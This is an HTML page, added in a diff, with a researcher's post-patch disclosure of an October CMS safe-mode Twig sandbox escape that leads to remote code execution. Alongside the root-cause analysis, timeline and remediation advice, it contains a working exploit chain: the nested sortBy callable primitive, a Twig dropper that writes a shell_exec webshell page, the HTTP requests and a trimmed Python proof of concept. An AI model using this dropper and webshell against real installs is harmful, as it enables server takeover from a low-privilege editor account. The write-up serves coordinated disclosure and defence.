@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>october cms — safe-mode twig sandbox escape → rce · chu@antisec</title>
+    <meta name="description" content="a safe-mode twig sandbox escape in october cms: the callable filter in SafeCollection only checks the top level of each argument, and Collection::sortBy() accepts one nested deeper. file write → php code section on disk → rce as www-data. a bypass of the cve-2026-22692 fix, tracked as ghsa-8rgj-g632-3qfp, fixed in 4.2.25.">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Crect width='16' height='16' fill='%23080b09'/%3E%3Crect x='3' y='3' width='6' height='10' fill='%235df27f'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../styles.css">
+  </head>
+  <body>
+    <a class="skip" href="#main">skip to content</a>
+
+    <header class="chrome">
+      <div class="wrap chrome-in">
+        <a class="brand" href="../index.html">chu<span class="host">@antisec</span>:~/research$<span class="cursor" aria-hidden="true">▌</span></a>
+        <nav class="nav" aria-label="main">
+          <ul>
+            <li><a href="../index.html">home</a></li>
+            <li><a href="../research/index.html" aria-current="page">research</a></li>
+            <li><a href="../hackthebox/index.html">writeups</a></li>
+            <li><a href="../about.html">about</a></li>
+            <li><a href="https://adminions.ca/" target="_blank" rel="noopener">team</a></li>
+          </ul>
+        </nav>
+      </div>
+    </header>
+
+    <main id="main">
+      <article class="wrap hero">
+
+        <p class="crumbs"><a href="../research/index.html">← ../</a> octobercms-safemode-sandbox-rce</p>
+        <h1 class="h-prompt"><span class="ps1"><b>chu@antisec</b>:~/research$</span> cat octobercms-safemode-sandbox-rce</h1>
+        <p class="cmd">october cms — safe-mode twig sandbox escape → rce · a bypass of the cve-2026-22692 fix</p>
+
+        <ul class="meta">
+          <li class="chip">vendor=octobercms</li>
+          <li class="chip">product=&lt; 4.2.25</li>
+          <li class="chip">--cwe=94</li>
+          <li class="chip">id=ghsa-8rgj-g632-3qfp</li>
+          <li class="chip">bypass_of=cve-2026-22692</li>
+          <li class="chip chip--phos">fixed=4.2.25</li>
+          <li class="chip chip--phos">found_by=chu</li>
+          <li class="badge badge--draft">draft</li>
+        </ul>
+
+        <blockquote class="stdout stdout--tldr">
+          <p>october's <code>cms.safe_mode</code> has one job: let semi-trusted backend users edit template
+            <strong>markup</strong> without ever running server-side php. the proxy that enforces it,
+            <code>SafeCollection</code>, strips callables from collection method arguments — but only at the
+            <strong>top level</strong>. laravel's <code>Collection::sortBy()</code> happily accepts an
+            <em>array of comparisons</em>, so a callable hidden as
+            <code>[[['Class','method']]]</code> sails past the filter and gets invoked with two
+            attacker-controlled strings. point it at <code>File::put()</code> and you have an arbitrary file
+            write; and since <code>checkSafeMode()</code> only runs at <em>save time</em>, a
+            <code>.htm</code> written straight to disk with a php code section is never inspected — request it
+            and it runs. <strong>safe-mode off, rce as www-data, from an ordinary content-editor account.</strong>
+            it's a bypass of the cve-2026-22692 fix; the vendor tracked it as
+            <strong>ghsa-8rgj-g632-3qfp</strong> and shipped the fix in <strong>4.2.25</strong>.</p>
+        </blockquote>
+<br>
+        <div class="sec-head">
+          <span class="sec-num" aria-hidden="true">[01]</span>
+          <h2 class="sec-title">the bug</h2>
+          <span class="sec-tail">a callable one level too deep</span>
+        </div>
+        <div class="prose">
+          <p>safe mode has two jobs: block the php <code>code</code> section of cms templates, and render the
+            remaining twig through a sandbox, <code>System\Twig\SecurityPolicy</code>. the policy is permissive
+            everywhere except method calls — it allow-lists <em>every</em> method on a handful of framework
+            classes, <code>Illuminate\Support\Collection</code> among them. to keep the obvious
+            <code>collection.map('system')</code> from working, october casts the receiver of each method call
+            to a safe proxy: a <code>Collection</code> becomes a <code>SafeCollection</code> that nulls callable
+            arguments. and <code>collect()</code> stays available in safe mode, so an attacker can build a
+            <code>SafeCollection</code> whose items they fully control. that proxy is the whole wall.</p>
+        </div>
+
+        <figure class="code">
+          <figcaption class="code-cap"><span class="dot">●</span> SafeCollection.php <span class="cap-right">php · the wall, modules/system/twig/securitypolicy/</span></figcaption>
+          <pre><code><span class="tk-c">// __call() — every allow-listed collection method funnels through here</span>
+<span class="tk-k">public function</span> <span class="tk-f">__call</span>($method, $parameters)
+{
+    <span class="tk-k">if</span> (<span class="tk-f">in_array</span>($method, $this-&gt;blockedMethods)) {  <span class="tk-c">// mapInto / pipeInto / toResourceCollection</span>
+        <span class="tk-k">return</span> $this;                                <span class="tk-c">// no-op'd since cve-2026-22692</span>
+    }
+
+    <span class="tk-k">foreach</span> ($parameters <span class="tk-k">as</span> &amp;$param) {
+        <span class="tk-k">if</span> (
+            <span class="tk-f">is_callable</span>($param) &amp;&amp;                   <span class="tk-c">// &lt;-- TOP-LEVEL check only</span>
+            (!<span class="tk-f">in_array</span>($method, $this-&gt;hybridCallableArgs) || !<span class="tk-f">is_string</span>($param))
+        ) {
+            $param = <span class="tk-k">null</span>;                           <span class="tk-c">// callables get nulled</span>
+        }
+    }
+
+    <span class="tk-k">return</span> $this-&gt;<span class="tk-f">forwardCallTo</span>($this-&gt;collection, $method, $parameters);
+}</code></pre>
+        </figure>
+
+        <div class="prose">
+          <p>the guard walks each argument and nulls anything <code>is_callable()</code> flags — applied to the
+            argument <strong>as a whole</strong>, never recursing into arrays. a direct
+            <code>map('system')</code> is correctly killed. but <code>is_callable([[['Class','method']]])</code>
+            is <strong>false</strong>: the outer value is a one-element array, not a
+            <code>[target, method]</code> pair. a callable buried one level deeper is never stripped.</p>
+          <p>laravel, meanwhile, ships a method that will call one. <code>sortBy()</code> accepts an array of
+            comparisons; an array that isn't itself callable routes to <code>sortByMany()</code>, whose
+            comparator invokes whatever sits at <code>$comparison[0]</code> when it's a non-string callable —
+            with two collection items as arguments.</p>
+        </div>
+
+        <figure class="code">
+          <figcaption class="code-cap"><span class="dot">●</span> Collection.php <span class="cap-right">php · vendor/laravel/framework · the other half</span></figcaption>
+          <pre><code><span class="tk-c">// :1586</span>
+<span class="tk-k">public function</span> <span class="tk-f">sortBy</span>($callback, $options = SORT_REGULAR, $descending = <span class="tk-k">false</span>)
+{
+    <span class="tk-k">if</span> (<span class="tk-f">is_array</span>($callback) &amp;&amp; ! <span class="tk-f">is_callable</span>($callback)) {  <span class="tk-c">// [[['Class','m']]] -&gt; not callable</span>
+        <span class="tk-k">return</span> $this-&gt;<span class="tk-f">sortByMany</span>($callback, $options);      <span class="tk-c">// -&gt; multi-comparison path</span>
+    } ...
+}
+
+<span class="tk-c">// :1623</span>
+<span class="tk-k">protected function</span> <span class="tk-f">sortByMany</span>(<span class="tk-k">array</span> $comparisons = [], <span class="tk-k">int</span> $options = SORT_REGULAR)
+{
+    $items = $this-&gt;items;
+    <span class="tk-f">uasort</span>($items, <span class="tk-k">function</span> ($a, $b) <span class="tk-k">use</span> ($comparisons, $options) {
+        <span class="tk-k">foreach</span> ($comparisons <span class="tk-k">as</span> $comparison) {
+            $comparison = Arr::<span class="tk-f">wrap</span>($comparison);
+            $prop = $comparison[<span class="tk-n">0</span>];                       <span class="tk-c">// = ['Class','method'] — smuggled</span>
+            <span class="tk-k">if</span> (! <span class="tk-f">is_string</span>($prop) &amp;&amp; <span class="tk-f">is_callable</span>($prop)) {
+                $result = $prop($a, $b);                    <span class="tk-c">// INVOKED with attacker items</span>
+            } ...</code></pre>
+        </figure>
+
+        <div class="prose">
+          <p>put the two halves together and a single expression in sandboxed markup yields an arbitrary
+            <code>Class::method(string, string)</code>:</p>
+        </div>
+
+        <figure class="code">
+          <figcaption class="code-cap"><span class="dot">●</span> the escape primitive <span class="cap-right">twig · cms page markup, safe mode on</span></figcaption>
+          <pre><code>{{ <span class="tk-f">collect</span>([<span class="tk-s">'A'</span>,<span class="tk-s">'B'</span>]).<span class="tk-f">sortBy</span>([[[<span class="tk-s">'Illuminate\\Support\\Facades\\Log'</span>,<span class="tk-s">'info'</span>]]]) }}
+<span class="tk-c">{# =&gt; Log::info('A','B') — the callable was never stripped; sortByMany invoked it #}</span></code></pre>
+        </figure>
+
+        <figure class="fig">
+          <pre>  safe-mode twig markup
+      │   {{ collect([...]).sortBy([[['Class','method']]]) }}
+      ▼
+  SecurityPolicy allow-list — Collection methods pass
+      │   castMethodObjectToSafeObject: Collection → SafeCollection
+      ▼
+  SafeCollection::__call — is_callable([[['Class','method']]]) === <span class="hl">false</span>
+      │   top-level check only; the nested pair survives
+      ▼
+  Collection::sortByMany — $comparison[0] is callable → $prop($a, $b)
+      │   Class::method(item0, item1), both attacker-controlled
+      ▼
+  File::put(path, '&lt;?php … ?&gt;') → .htm with a php code section on disk
+      │   checkSafeMode() runs at SAVE time only — never saw this file
+      ▼
+  GET /poc-shell → CodeParser compiles onStart() → <span class="hl">rce as www-data</span></pre>
+        <figcaption class="fig-cap"><b>fig 01</b> — from one twig expression to code execution. four hops, none of them exotic.</figcaption>
+      </figure>
+<br>
+      <div class="sec-head">
+        <span class="sec-num" aria-hidden="true">[02]</span>
+        <h2 class="sec-title">why the cve-2026-22692 fix didn't cover this</h2>
+        <span class="sec-tail">the blocklist stopped at mapInto</span>
+      </div>
+      <div class="prose">
+        <p>cve-2026-22692 (ghsa-m5qg-jc75-4jp6) was fixed by adding <code>SafeCollection</code> and putting
+          <code>mapInto</code> on its blocklist (v3.7.13 / v4.1.5). for <strong>top-level</strong> arguments
+          that fix works fine — verified: the naive callable gets nulled and the call dies with a type error.
+          the gap is that any collection method accepting <em>arrays containing callables</em> puts the
+          primitive right back. <code>sortBy</code>/<code>sortByDesc</code>, through
+          <code>sortByMany</code>, are the ones used here; the general audit is "every method that
+          <code>Arr::wrap()</code>s an argument and then treats element 0 as a callable". patching the
+          method list is whack-a-mole by construction.</p>
+        <p>there's a second gap in the same spirit: the safe cast only wraps three receiver types —
+          <code>Collection</code>, <code>Session\Store</code> and <code>Request</code>. other allow-listed
+          classes that hand a callable to an inner collection aren't wrapped at all;
+          <code>AbstractPaginator::through()</code> and <code>ComponentAttributeBag::filter()</code> both
+          look like the same bug waiting in a different room.</p>
+        <p>the pieces are older than the advisory window, too. <code>SafeCollection</code>, with its
+          top-level-only filter, has been in <code>october/rain</code> since v3.5.0 and has
+          <strong>never</strong> blocked <code>sortBy</code>; the <code>collect()</code> helper and the
+          receiver cast the chain relies on landed in <code>october/october</code> at v4.0.0; and at
+          v4.2.21 the class moved to <code>System\Twig\SecurityPolicy\SafeCollection</code>. the published
+          advisory scopes it as <strong>≥ 4.2.0, &lt; 4.2.25</strong>, and that's the range to patch against.
+          confirmed dynamically on 4.2.24, the latest release at report time.</p>
+      </div>
+<br>
+      <div class="sec-head">
+        <span class="sec-num" aria-hidden="true">[03]</span>
+        <h2 class="sec-title">poc</h2>
+        <span class="sec-tail">4.2.24 · safe_mode=true · trimmed</span>
+      </div>
+      <p class="small dim">target: a clean october cms 4.2.24 install with <code>cms.safe_mode = true</code>.
+        starting point: an authenticated low-privilege content editor — <code>editor.cms_pages</code> only,
+        no php/developer permission, no superuser. every request goes through burp; the chain below is
+        trimmed, and no credentials are published here. run things like this only against an install you own.</p>
+
+      <figure class="fig">
+        <img src="../img/octobercms/oct-editor-perms.png" alt="October CMS backend logged in as the content editor: the top menu shows only Editor, with no Settings or Administrators" width="1312" height="419" loading="lazy">
+        <figcaption class="fig-cap"><b>fig 02</b> — the attacker's session: the menu shows only the cms editor. no settings, no administrators. exactly the account safe mode exists to contain.</figcaption>
+      </figure>
+
+      <p class="small"><b>step 1</b> — sign in as the content editor through the backend form (csrf and all).
+        an ordinary account an operator would hand to any content person.</p>
+      <figure class="fig">
+        <img src="../img/octobercms/oct-login.png" alt="Burp Repeater: POST to the backend auth signin endpoint returns HTTP 302 to the backend, session established" width="1546" height="517" loading="lazy">
+        <figcaption class="fig-cap"><b>fig 03</b> — step 1: the signin comes back <strong>302</strong> to the backend. nothing privileged about this session — that's the point.</figcaption>
+      </figure>
+
+      <p class="small"><b>step 2</b> — save a cms page through the backend editor api, sending
+        <strong>only <code>markup</code></strong>. twig is allowed in safe mode; the php <code>code</code>
+        section is the only thing the save-time check inspects, and there isn't one. the markup is the
+        dropper: it uses the escape with the <code>File::put</code> gadget to plant a second page that
+        <em>does</em> carry a php code section.</p>
+      <figure class="code">
+        <figcaption class="code-cap"><span class="dot">●</span> step2-save.http <span class="cap-right">http · markup only, nothing for the check to see</span></figcaption>
+        <pre><code>POST /admin/editor HTTP/1.1
+X-AJAX-HANDLER: onCommand
+X-CSRF-TOKEN: &lt;csrf&gt;
+
+extension=cms&amp;command=onSaveDocument
+&amp;documentMetadata[type]=cms-page&amp;documentMetadata[theme]=demo
+&amp;documentData[fileName]=poc-dropper.htm&amp;documentData[settings][url]=/poc-dropper
+&amp;documentData[markup]=&lt;the dropper twig below&gt;
+
+HTTP/1.1 200 OK</code></pre>
+      </figure>
+      <figure class="code">
+        <figcaption class="code-cap"><span class="dot">●</span> documentData[markup] <span class="cap-right">twig · the dropper</span></figcaption>
+        <pre><code>{% <span class="tk-k">set</span> nl = <span class="tk-s">"\n"</span> %}{% <span class="tk-k">set</span> eq = <span class="tk-s">"=="</span> %}
+{% <span class="tk-k">set</span> php = <span class="tk-s">'&lt;?php'</span> ~ nl ~ <span class="tk-s">'function onStart() { return Response::make("POC-OUT-START".shell_exec($_SERVER["HTTP_X_POC_CMD"] ?? "id")."POC-OUT-END"); }'</span> ~ nl ~ <span class="tk-s">'?&gt;'</span> %}
+{% <span class="tk-k">set</span> body = <span class="tk-s">'url = "/poc-shell"'</span> ~ nl ~ eq ~ nl ~ php ~ nl ~ eq ~ nl ~ <span class="tk-s">'webshell'</span> ~ nl %}
+{% <span class="tk-k">set</span> r = <span class="tk-f">collect</span>([<span class="tk-s">'&lt;webroot&gt;/themes/demo/pages/poc-shell.htm'</span>, body])
+    .<span class="tk-f">sortBy</span>([[[<span class="tk-s">'Illuminate\\Support\\Facades\\File'</span>, <span class="tk-s">'put'</span>]]]) %}
+DROPPER-OK
+<span class="tk-c">{# the "==" separators are built as twig strings so SectionParser never splits the outer template #}</span></code></pre>
+      </figure>
+      <figure class="fig">
+        <img src="../img/octobercms/oct-save.png" alt="Burp Repeater: POST /admin/editor with X-AJAX-HANDLER onCommand and documentData[markup] saves the CMS page, server returns HTTP 200" width="1537" height="563" loading="lazy">
+        <figcaption class="fig-cap"><b>fig 04</b> — step 2: the page saves clean, <strong>200</strong>. safe mode has no objection — markup is what it's for.</figcaption>
+      </figure>
+
+      <p class="small"><b>step 3</b> — render the dropper. the sandbox escape calls
+        <code>File::put()</code> and the webshell page lands on disk.</p>
+      <figure class="fig">
+        <img src="../img/octobercms/oct-trigger.png" alt="Burp Repeater: GET /poc-dropper returns HTTP 200 DROPPER-OK; the sandbox escape ran File::put" width="1540" height="325" loading="lazy">
+        <figcaption class="fig-cap"><b>fig 05</b> — step 3: <code>GET /poc-dropper</code> → <strong>200 DROPPER-OK</strong>. the write happened inside the sandbox that was supposed to make it impossible.</figcaption>
+      </figure>
+
+      <p class="small"><b>step 4</b> — the dropped page's php code section was <em>written</em>, not
+        <em>saved</em>, so no model ever ran <code>checkSafeMode()</code> on it. requesting it executes.</p>
+      <figure class="code">
+        <figcaption class="code-cap"><span class="dot">●</span> step4-rce.http <span class="cap-right">http · write ≠ save ≠ checked</span></figcaption>
+        <pre><code>GET /poc-shell HTTP/1.1
+X-POC-CMD: id
+
+HTTP/1.1 200 OK
+<span class="tk-k">POC-OUT-START</span>uid=33(www-data) gid=33(www-data) groups=33(www-data)<span class="tk-k">POC-OUT-END</span></code></pre>
+      </figure>
+      <figure class="fig">
+        <img src="../img/octobercms/oct-rce.png" alt="Burp Repeater: GET /poc-shell with header X-POC-CMD: id returns uid=33(www-data) wrapped in POC-OUT markers" width="1549" height="308" loading="lazy">
+        <figcaption class="fig-cap"><b>fig 06</b> — step 4: <code>id</code> comes back as <strong>uid=33(www-data)</strong>. code execution as the web user, from a content-editor login.</figcaption>
+      </figure>
+
+      <p class="small dim">the whole chain, automated — sign in, save the dropper, trigger it, run a command —
+        in <code>poc_october_safemode_rce.py</code>. trimmed to the parts that matter:</p>
+
+      <figure class="code">
+        <figcaption class="code-cap"><span class="dot">●</span> poc_october_safemode_rce.py <span class="cap-right">python · trimmed</span></figcaption>
+        <pre><code><span class="tk-c">#!/usr/bin/env python3</span>
+<span class="tk-c"># poc_october_safemode_rce.py — october cms safe-mode sandbox escape → rce (&lt; 4.2.25)</span>
+<span class="tk-c"># trimmed; the full script ships with the advisory. target installs you own only.</span>
+
+<span class="tk-c"># the dropper: plain twig MARKUP, no php `code` section — the save-time</span>
+<span class="tk-c"># safe-mode check only inspects `code`, so the page saves cleanly.</span>
+DROPPER_MARKUP = <span class="tk-s">r'''{% set nl = "\n" %}</span>
+<span class="tk-s">{% set eq = "==" %}</span>
+<span class="tk-s">{% set php = '&lt;?php' ~ nl ~ 'function onStart() { return Response::make("POC-OUT-START".shell_exec($_SERVER["HTTP_X_POC_CMD"] ?? "id")."POC-OUT-END"); }' ~ nl ~ '?&gt;' %}</span>
+<span class="tk-s">{% set body = 'url = "/poc-shell"' ~ nl ~ eq ~ nl ~ php ~ nl ~ eq ~ nl ~ 'webshell' ~ nl %}</span>
+<span class="tk-s">{% set r = collect(['&lt;webroot&gt;/themes/demo/pages/poc-shell.htm', body])</span>
+<span class="tk-s">    .sortBy([[['Illuminate\\Support\\Facades\\File', 'put']]]) %}</span>
+<span class="tk-s">DROPPER-OK</span>
+<span class="tk-s">'''</span>
+
+<span class="tk-c"># 1 — authenticate as a low-priv cms editor (backend signin form + csrf)</span>
+<span class="tk-c"># 2 — save the dropper through the backend editor api (markup only)</span>
+<span class="tk-c"># 3 — GET the dropper → the escape invokes File::put → the shell page is on disk</span>
+s.<span class="tk-f">get</span>(<span class="tk-s">f"{base}/{dropper_url}"</span>)
+
+<span class="tk-c"># 4 — the dropped page's php code section was written, not saved: never checked</span>
+r = s.<span class="tk-f">get</span>(<span class="tk-s">f"{base}/{shell_url}"</span>, headers={<span class="tk-s">"X-POC-CMD"</span>: <span class="tk-s">"id"</span>})
+out = re.<span class="tk-f">search</span>(<span class="tk-s">r"POC-OUT-START(.*?)POC-OUT-END"</span>, r.text, re.S).<span class="tk-f">group</span>(<span class="tk-n">1</span>)
+<span class="tk-c"># → uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+<span class="tk-c"># → REMOTE CODE EXECUTION CONFIRMED</span></code></pre>
+      </figure>
+
+      <div class="grid grid--2">
+        <figure class="fig">
+          <img src="../img/octobercms/oct-poc-run.png" alt="Automated PoC console with --cmd 'id': the full four-step chain then uid=33(www-data), REMOTE CODE EXECUTION CONFIRMED" width="869" height="341" loading="lazy">
+          <figcaption class="fig-cap"><b>fig 07a</b> — the automated chain end to end with <code>--cmd 'id'</code>: login, save, escape, <strong>rce</strong>.</figcaption>
+        </figure>
+        <figure class="fig">
+          <img src="../img/octobercms/oct-safemode.png" alt="Automated PoC console with --cmd 'env | grep SAFE': returns CMS_SAFE_MODE=true" width="870" height="331" loading="lazy">
+          <figcaption class="fig-cap"><b>fig 07b</b> — same chain, <code>--cmd 'env | grep SAFE'</code> → <code>CMS_SAFE_MODE=true</code>. the rce ran with safe mode on.</figcaption>
+        </figure>
+      </div>
+
+      <p class="small dim">the contrast that proves the sandbox was genuinely active, not accidentally off:
+        the naive <code>collect(['x']).map('system')</code> is correctly blocked — the callable gets nulled —
+        and <code>env()</code>/<code>config()</code> are pulled from twig in safe mode. only the nested
+        <code>sortBy</code> form slips through.</p>
+      <figure class="fig">
+        <img src="../img/octobercms/oct-sandbox-on.png" alt="Burp Repeater: collect(['x']).map('system') returns HTTP 500, Argument #1 ($callback) must be of type callable, null given" width="1539" height="820" loading="lazy">
+        <figcaption class="fig-cap"><b>fig 08</b> — control test: <code>map('system')</code> → <strong>500</strong>, <code>Argument #1 ($callback) must be of type callable, null given</code>. the proxy did its job at the top level. that's the only level it does it at.</figcaption>
+      </figure>
+<br>
+      <div class="sec-head">
+        <span class="sec-num" aria-hidden="true">[04]</span>
+        <h2 class="sec-title">impact</h2>
+        <span class="sec-tail">editor.cms_pages → www-data</span>
+      </div>
+      <ul class="ls">
+        <li><span class="ls-mode" aria-hidden="true">$</span><span class="ls-name">remote code execution as the web user</span><span class="ls-extra">→ arbitrary php as www-data, from a content-editor session</span></li>
+        <li><span class="ls-mode" aria-hidden="true">$</span><span class="ls-name">the safe-mode promise, void</span><span class="ls-extra">→ "templates can't run server code" is the control's entire job; one expression undoes it</span></li>
+        <li><span class="ls-mode" aria-hidden="true">$</span><span class="ls-name">privilege escalation</span><span class="ls-extra">→ markup editing (<code>editor.cms_pages</code>) to os-level access, no php/developer or superuser rights held</span></li>
+        <li><span class="ls-mode" aria-hidden="true">$</span><span class="ls-name">full compromise from there</span><span class="ls-extra">→ arbitrary file read/write, the database, <code>.env</code> (<code>APP_KEY</code>, db credentials), all tenant content</span></li>
+      </ul>
+      <p class="small dim">gadget generality: <code>File::put</code> is just the gadget used here — any
+        <code>(string, string)</code> method that does something useful (a writer, a mailer, a query runner)
+        works the same, so a patch limited to <code>File::put</code> would have been theatre. october's
+        4.2.25 fix strips callables recursively instead, which is the right shape. same sandbox, third
+        escape: cve-2023-44382, cve-2026-22692 — whose fix this bypasses — and now
+        ghsa-8rgj-g632-3qfp. that pattern points at the allow-list-then-subtract design, not at any single
+        method. distinct from cve-2026-26274 (the db-write safe-mode bypass) and the twig-core
+        cve-2026-24425 (the <code>|sort</code>/<code>|filter</code>/<code>|map</code>/<code>|reduce</code>
+        filters under a SourcePolicyInterface); this one rides the <code>.sortBy()</code> method.
+        october rates it low — safe mode is opt-in, and where it's off a markup editor can run php by
+        design. fair. but for installs that switched safe mode on precisely to contain editors, the control
+        fails all the way to code execution; scored here as cvss 3.1 8.8
+        (<code>AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code>). the label was never the interesting part.</p>
+<br>
+      <div class="sec-head">
+        <span class="sec-num" aria-hidden="true">[05]</span>
+        <h2 class="sec-title">disclosure timeline</h2>
+        <span class="sec-tail">coordinated · closed</span>
+      </div>
+      <ul class="tl">
+        <li class="is-done"><span class="t-date">2026-06-02</span><span class="t-what">vendor ships 4.2.24</span>
+          <span class="t-note">the latest release at report time — and the build the whole chain was validated
+            against.</span></li>
+        <li class="is-done"><span class="t-date">2026-06-08</span><span class="t-what">discovery + private report</span>
+          <span class="t-note">end-to-end validation on a clean 4.2.24 with <code>cms.safe_mode = true</code>
+            (escape → file write → <code>id</code> as www-data), then a coordinated report to the october cms
+            security team via github private vulnerability reporting. 90-day window acknowledged; details held
+            until a fix shipped.</span></li>
+        <li class="is-done"><span class="t-date">2026-06-09</span><span class="t-what">vendor triage</span>
+          <span class="t-note">reproduced and confirmed; rated low under october's trust model (researcher
+            score: 8.8 high). fix assigned to <strong>4.2.25</strong>; advisory
+            <code>ghsa-8rgj-g632-3qfp</code> drafted with researcher credit to repo4chu.</span></li>
+        <li class="is-done"><span class="t-date">v4.2.25</span><span class="t-what">fix released + advisory public</span>
+          <span class="t-note"><code>SafeCollection</code> now strips callables recursively before forwarding,
+            keeping the hybrid string-keep behaviour for <code>contains</code>/<code>groupBy</code> and
+            friends. advisory published with credit.</span></li>
+        <li class="is-done"><span class="t-date">2026-09</span><span class="t-what">public disclosure</span>
+          <span class="t-note">this page.</span></li>
+      </ul>
+<br>
+      <div class="sec-head">
+        <span class="sec-num" aria-hidden="true">[06]</span>
+        <h2 class="sec-title">remediation</h2>
+        <span class="sec-tail">4.2.25 closes it</span>
+      </div>
+      <div class="prose">
+        <h3>if you run october cms</h3>
+        <ul>
+          <li><strong>upgrade to 4.2.25 or later.</strong> the recursive callable strip in
+            <code>SafeCollection</code> is the actual fix — nothing short of it closes this.</li>
+          <li>treat cms template-editing permissions (<code>editor.cms_pages</code> and siblings) as
+            developer-level trust, safe mode on or not. don't hand them to users you wouldn't hand a shell.</li>
+          <li>hunt: templates containing <code>sortBy(</code> with nested arrays, unexpected new
+            <code>.htm</code> files in theme directories, writes outside the theme tree.</li>
+        </ul>
+        <h3>if you maintain a sandbox</h3>
+        <ul>
+          <li>strip callables <strong>recursively</strong>, or reject any argument containing a callable at
+            any depth. a top-level check is a suggestion, not a filter.</li>
+          <li>explicitly neutralize the array-of-comparisons forms (<code>sortBy</code> /
+            <code>sortByDesc</code> via <code>sortByMany</code>).</li>
+          <li>treat the allow-list as deny-by-default: wrap or refuse every allow-listed class that can hand
+            a callable to an inner collection — <code>AbstractPaginator::through()</code> and
+            <code>ComponentAttributeBag::filter()</code> are the same gap one room over.</li>
+          <li>enforce safe mode at <strong>render time</strong> in <code>CodeParser</code> too: refuse to
+            compile a non-empty php code section while it's on, so a stray on-disk <code>.htm</code> can't
+            execute on its own, independent of any sandbox bug.</li>
+        </ul>
+      </div>
+
+      <figure class="code">
+        <figcaption class="code-cap"><span class="dot">●</span> the 4.2.25 shape <span class="cap-right">php · conceptual</span></figcaption>
+        <pre><code><span class="tk-k">function</span> <span class="tk-f">stripCallables</span>($value) {
+    <span class="tk-k">if</span> (<span class="tk-f">is_callable</span>($value)) <span class="tk-k">return</span> <span class="tk-k">null</span>;
+    <span class="tk-k">if</span> (<span class="tk-f">is_array</span>($value)) <span class="tk-k">return</span> <span class="tk-f">array_map</span>([$this, <span class="tk-s">'stripCallables'</span>], $value);  <span class="tk-c">// recurse</span>
+    <span class="tk-k">return</span> $value;
+}
+<span class="tk-c">// applied to every argument in SafeCollection::__call() before the forward —</span>
+<span class="tk-c">// a callable can't reach sortByMany() however deeply it's nested</span></code></pre>
+      </figure>
+
+      <blockquote class="stdout">
+        <p>credit: found and reported by <strong>chu</strong>, june 2026 — credited by the vendor as
+          <strong>repo4chu</strong> on <code>ghsa-8rgj-g632-3qfp</code>, fix shipped in 4.2.25. reported
+          privately through github's coordinated vulnerability reporting; no exploit details went public
+          before the patch. the advisory is ghsa-only, no cve assigned. questions →
+          <a href="../about.html#contact">contact</a>.</p>
+      </blockquote>
+
+    </article>
+  </main>
+
+  <footer class="foot">
+    <div class="wrap">
+      <div class="foot-row">
+        <p>chu@antisec — long life for the hacking and the cats!<span aria-hidden="true"></span></p>
+      </div>
+      <div class="foot-row">
+        <p>© 2026 chu · <a href="../research/index.html">← research</a> · <a href="../about.html#contact">contact</a></p>
+      </div>
+    </div>
+  </footer>
+  <script src="../zoom.js" defer></script>
+</body>
+</html>
